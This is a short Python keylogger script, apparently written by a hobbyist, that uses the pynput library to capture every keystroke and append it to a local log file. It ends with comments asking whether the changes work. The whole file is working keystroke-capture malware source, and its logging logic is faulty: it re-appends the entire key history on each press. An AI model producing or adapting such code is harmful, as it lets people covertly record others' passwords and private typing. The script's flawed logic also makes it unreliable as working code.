import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    write_file(keys)

def write_file(key):
    with open("E://log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)
    # Voila, I found that to be working in the System<
    # I made some modifications, Will it Work or not?

def on_release(key):
    if(key == Key.esc):
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
# My name is Avanish Gupta
